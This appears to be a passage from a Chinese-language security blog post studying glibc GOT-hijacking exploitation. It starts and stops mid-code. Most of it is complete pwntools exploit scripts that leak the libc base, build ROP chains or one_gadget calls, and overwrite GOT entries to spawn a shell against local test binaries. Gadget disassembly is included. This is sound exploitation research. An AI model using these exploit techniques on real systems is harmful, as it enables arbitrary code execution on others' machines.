class="number">0x3000</span> - <span class="number">8</span>]</span><br><span class="line">    &#125;, filler=p64(ret), word_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">got = lbase + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">mempcpy_got = lbase + <span class="number">0x219040</span></span><br><span class="line">got_slot = (mempcpy_got - got) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line">prdi = lbase + <span class="number">0x000000000002a3e5</span>  <span class="comment"># pop rdi; ret</span></span><br><span class="line">prax = lbase + <span class="number">0x0000000000045eb0</span>  <span class="comment"># pop rax; ret</span></span><br><span class="line"></span><br><span class="line">rop_chain = flat(</span><br><span class="line">    prdi, libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__(),</span><br><span class="line">    prax, libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">)</span><br><span class="line">dest, payload = fx4(libc, slot=(mempcpy_got - got) // <span class="number">8</span>, rop_chain=rop_chain)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207162602156.png"></p>
<p>这样利用需要发送0x50 bytes的payload，有没有什么方法再缩短一下？请看下文。</p>
<h3 id="0x06-fx5"><a href="#0x06-fx5" class="headerlink" title="0x06. fx5"></a>0x06. fx5</h3><p>如果说还有哪里能用来缩短payload，那大概就是rop chain本身了。在fx4中我们使用了0x20 bytes去调用system。这次我们尝试直接调用one_gadget。</p>
<p>在one_gadget的结果中有如下一条，似乎只要让rsp指向一片空内存即可，这配合我们的栈迁移gadget简直刚好。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$one_gadget ./libc-2.35.so -l1</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">0x10dbb2 posix_spawn(rsp+0x64, &quot;/bin/sh&quot;, [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span><br><span class="line">  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp</span><br><span class="line">  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] &lt;= 0</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>



<p>但如果我们带着下面的三个跑到这个onegadget，会发现虽然貌似execve成功了，但程序还是crash了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[rsp+0x70] == NULL</span><br><span class="line">[rsp+0xf0] == NULL</span><br><span class="line">[rsp+0x40] == NULL</span><br></pre></td></tr></table></figure>

<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164330720.png"></p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164338252.png"></p>
<p>设置好<code>set follow-fork-mode parent</code>重新测试，崩溃的原因是null-deref。</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164423438.png"></p>
<p>而通过这个跟踪，这个rdi的值其实来着前面的<code>[rsp+0x40]</code>。这里我尝试让这个值不为0，反而执行成功了（有点迷）：</p>
<p>给的<code>[rsp+0x40]</code>是这里的<code>0x7ffff7facaa0</code>，rsp是<code>0x7ffff7fad830</code>：</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207164648648.png"></p>
<ul>
<li>完整代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.35.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fx5</span>(<span class="params">libc: ELF, slot, rop_chain</span>):</span><br><span class="line">    got = libc.address + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">    plt0 = libc.address + libc.get_section_by_name(<span class="string">&quot;.plt&quot;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    pivot = libc.address + <span class="number">0x0000000000035732</span>  <span class="comment"># pop rsp; ret</span></span><br><span class="line">    escape = libc.address + <span class="number">0x00000000000838f8</span>  <span class="comment"># pop rsp; jmp rax</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># let [rsp+0x40] != NULL ??</span></span><br><span class="line">    <span class="comment"># [rsp+0x70] == NULL</span></span><br><span class="line">    <span class="comment"># [rsp + 0xf0] == NULL</span></span><br><span class="line">    zero_buf = libc.address + <span class="number">0x21a870</span> - <span class="number">0x40</span></span><br><span class="line"></span><br><span class="line">    write_dest = got + <span class="number">8</span></span><br><span class="line">    trampoline_offset = slot * <span class="number">8</span> - (write_dest - got)</span><br><span class="line">    rop_chain2 = [rop_chain, escape, zero_buf]</span><br><span class="line">    rop_offset = <span class="number">0x10</span></span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(rop_chain) &lt;= trampoline_offset - <span class="number">0x10</span> - <span class="number">8</span>, <span class="string">&quot;use fx3 instead&quot;</span></span><br><span class="line">    info(<span class="string">&quot;rop offset: 0x&#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(rop_offset))</span><br><span class="line">    write_data = flat(&#123;</span><br><span class="line">        <span class="number">0x00</span>: write_dest + rop_offset,</span><br><span class="line">        <span class="number">0x08</span>: pivot,</span><br><span class="line">        rop_offset: rop_chain2,</span><br><span class="line">        trampoline_offset: plt0,</span><br><span class="line">    &#125;, word_size=<span class="number">64</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> write_dest, write_data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line">got = lbase + libc.dynamic_value_by_tag(<span class="string">&quot;DT_PLTGOT&quot;</span>)</span><br><span class="line">mempcpy_got = lbase + <span class="number">0x219040</span></span><br><span class="line">got_slot = (mempcpy_got - got) // <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x10dbb2 posix_spawn(rsp+0x64, &quot;/bin/sh&quot;, [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsp+0x70] == NULL || &#123;[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...&#125; is a valid argv</span></span><br><span class="line"><span class="string">  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL || [rsp+0xf0] is a valid envp</span></span><br><span class="line"><span class="string">  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] &lt;= 0</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">one_gadget = lbase + <span class="number">0x10dbb2</span></span><br><span class="line">prax = lbase + <span class="number">0x0000000000045eb0</span>  <span class="comment"># pop rax; ret</span></span><br><span class="line"></span><br><span class="line">rop_chain = flat(prax, one_gadget)</span><br><span class="line">dest, payload = fx5(libc, slot=(mempcpy_got - got) // <span class="number">8</span>, rop_chain=rop_chain)</span><br><span class="line"></span><br><span class="line">ss(<span class="string">&quot;write payload to &#123;&#125;, length &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(dest), <span class="built_in">hex</span>(<span class="built_in">len</span>(payload))))</span><br><span class="line">sd(p64(dest))</span><br><span class="line">sd(p64(<span class="built_in">len</span>(payload)))</span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">interact()</span><br></pre></td></tr></table></figure>



<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207163123614.png"></p>
<p>这样利用只需要发送0x40 bytes的payload，大概是极限了。</p>
<h3 id="0x07-one-punch"><a href="#0x07-one-punch" class="headerlink" title="0x07. one_punch"></a>0x07. one_punch</h3><p>这一切在glibc 2.35上都很美好，直到来到了glibc 2.36。从2.36开始GOT0就不可写了，但依然可以修改GOT表下面的每一项：</p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207165105689.png"></p>
<p><img src="/2023_12_07-glibc_got_hijack%E5%AD%A6%E4%B9%A0/image-20231207165134213.png"></p>
<p>这里@swing提供了一个只利用<code>.got.plt</code>做ROP的思路，不过我用他的payload没有复现成功，我自己做了一些改编。</p>
<p>这里我们用2.38做实验：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ ./ld-2.38.so ./libc-2.38.so</span><br><span class="line">GNU C Library (Ubuntu GLIBC 2.38-1ubuntu6) stable release version 2.38.</span><br><span class="line">Copyright (C) 2023 Free Software Foundation, Inc.</span><br><span class="line">This is free software; see the source for copying conditions.</span><br><span class="line">There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A</span><br><span class="line">PARTICULAR PURPOSE.</span><br><span class="line">Compiled by GNU CC version 13.2.0.</span><br><span class="line">libc ABIs: UNIQUE IFUNC ABSOLUTE</span><br><span class="line">Minimum supported kernel: 3.2.0</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs&gt;.</span><br><span class="line"></span><br><span class="line">$ sha256sum libc-2.38.so</span><br><span class="line">6ef35c68875f778d358c7bf53180565d63e9202a1ac28aba804ff4cf35d70698  libc-2.38.so</span><br></pre></td></tr></table></figure>



<p>首先，<code>printf</code>会调用到<code>strchrnul.got</code>，因此我们从这里劫持RIP是没有疑问的，问题是要改成啥。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.got.plt:00000000001FE0C8 off_1FE0C8      dq offset strchrnul</span><br></pre></td></tr></table></figure>



<p><strong>@swing</strong>巧妙的注意到，glibc中存在如下的代码片段：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000177D59                 lea     rdi, [rsp+18h]</span><br><span class="line">.text:0000000000177D5E                 mov     edx, 20h ; &#x27; &#x27;</span><br><span class="line">.text:0000000000177D63                 call    j_strncpy</span><br></pre></td></tr></table></figure>

<p>将rdi设置到rsp附近，然后调用<code>strncpy.got</code>。</p>
<blockquote>
<p>题外话，我用如下正则在IDA的反汇编结果中搜寻了一下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.*lea\s+rdi,\s+\[rsp\+.*\n(?:.*\n)&#123;0,9&#125;.*call\s+j_.*</span><br></pre></td></tr></table></figure>

<p>得到了一些可能派的上用处的相似gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000035C2E                 lea     rdi, [rsp+0Fh]</span><br><span class="line">.text:0000000000035C33                 mov     rcx, rsi</span><br><span class="line">.text:0000000000035C36                 mov     rdx, rsi</span><br><span class="line">.text:0000000000035C39                 mov     rsi, r15</span><br><span class="line">.text:0000000000035C3C                 and     rdi, 0FFFFFFFFFFFFFFF0h</span><br><span class="line">.text:0000000000035C40                 call    j___memcpy_chk</span><br><span class="line"></span><br><span class="line">.text:000000000008804E                 lea     rdi, [rsp+30h]</span><br><span class="line">.text:0000000000088053                 mov     rdx, r14</span><br><span class="line">.text:0000000000088056                 mov     r15, r14</span><br><span class="line">.text:0000000000088059                 call    j_memcpy_0</span><br><span class="line"></span><br><span class="line">.text:000000000005FD37                 lea     rdi, [rsp+90h]</span><br><span class="line">.text:000000000005FD3F                 cmp     rdi, rax</span><br><span class="line">.text:000000000005FD42                 jnb     loc_608CD</span><br><span class="line">.text:000000000005FD48                 sub     rax, rdi</span><br><span class="line">.text:000000000005FD4B                 mov     esi, 30h ; &#x27;0&#x27;</span><br><span class="line">.text:000000000005FD50                 mov     rdx, rax</span><br><span class="line">.text:000000000005FD53                 call    j_memset</span><br><span class="line"></span><br><span class="line">.text:0000000000159261                 lea     rdi, [rsp+5]</span><br><span class="line">.text:0000000000159266                 mov     rsi, r14</span><br><span class="line">.text:0000000000159269                 mov     byte ptr [rsp+4], 5Fh ; &#x27;_&#x27;</span><br><span class="line">.text:000000000015926E                 call    j_stpcpy</span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们可以将<code>strncpy.got</code>修改为如下的代码片段，从而继续ROP：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000D60A8                 pop     rbx</span><br><span class="line">.text:00000000000D60A9                 pop     rbp</span><br><span class="line">.text:00000000000D60AA                 pop     r12</span><br><span class="line">.text:00000000000D60AC                 pop     r13</span><br><span class="line">.text:00000000000D60AE                 jmp     j_wmemset_0</span><br></pre></td></tr></table></figure>

<p>这样rdi就正好和rsp相等了！然后我们可以将<code>wmemset.got</code>改为<code>gets</code>函数，从而直接在栈上写入ROP gadget。</p>
<ul>
<li>2.38 完整利用代码：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> inspect</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./vuln-2.38&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.38.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tobytes</span>(<span class="params">x</span>): <span class="keyword">return</span> x.encode(<span class="string">&#x27;latin1&#x27;</span>) <span class="keyword">if</span> <span class="built_in">isinstance</span>(x, <span class="built_in">str</span>) <span class="keyword">else</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.send(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sl</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.sendline(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sa</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sla</span>(<span class="params">a, b</span>): <span class="keyword">return</span> cn.sendlineafter(tobytes(a), tobytes(b))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rv</span>(<span class="params">x=<span class="number">0x1000</span></span>): <span class="keyword">return</span> cn.recv(x)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rl</span>(): <span class="keyword">return</span> cn.recvline()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">x</span>): <span class="keyword">return</span> cn.recvuntil(tobytes(x))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddr</span>(): <span class="keyword">return</span> u64(cn.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">raddrn</span>(<span class="params">x</span>): <span class="keyword">return</span> u64(rv(x).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">interact</span>(): <span class="keyword">return</span> cn.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ss</span>(<span class="params">s</span>): <span class="keyword">return</span> success(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logsym</span>(<span class="params">val</span>):</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> inspect.getframeinfo(inspect.currentframe().f_back)[<span class="number">3</span>]:</span><br><span class="line">        m = re.search(<span class="string">r&#x27;\blogsym\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        varname = m.group(<span class="number">1</span>)</span><br><span class="line">        ss(<span class="string">f&quot;<span class="subst">&#123;varname&#125;</span> =&gt; <span class="subst">&#123;<span class="built_in">hex</span>(val)&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ss(<span class="built_in">hex</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">############################################</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">leak = <span class="built_in">int</span>(rl(), <span class="number">16</span>)</span><br><span class="line">logsym(leak)</span><br><span class="line">lbase = leak - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">logsym(lbase)</span><br><span class="line">libc.address = lbase</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE078 off_1FE078      dq offset strncpy       ; DATA XREF: j_strncpy+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE080 off_1FE080      dq offset strlen        ; DATA XREF: j_strlen+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE088 off_1FE088      dq offset wcscat        ; DATA XREF: j_wcscat+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE090 off_1FE090      dq offset strcasecmp_l  ; DATA XREF: j_strcasecmp_l+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE098 off_1FE098      dq offset strcpy        ; DATA XREF: j_strcpy+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE0A0 off_1FE0A0      dq offset wcschr        ; DATA XREF: j_wcschr+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE0A8 off_1FE0A8      dq offset _dl_deallocate_tls</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE0B0 off_1FE0B0      dq offset __tls_get_addr</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE0B8 off_1FE0B8      dq offset wmemset       ; DATA XREF: j_wmemset_0+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE0C0 off_1FE0C0      dq offset memcmp        ; DATA XREF: j_memcmp+4↑r</span></span><br><span class="line"><span class="string">.got.plt:00000000001FE0C8 off_1FE0C8      dq offset strchrnul     ; DATA XREF: j_strchrnul+4↑r</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># overwrite strchrnul.got 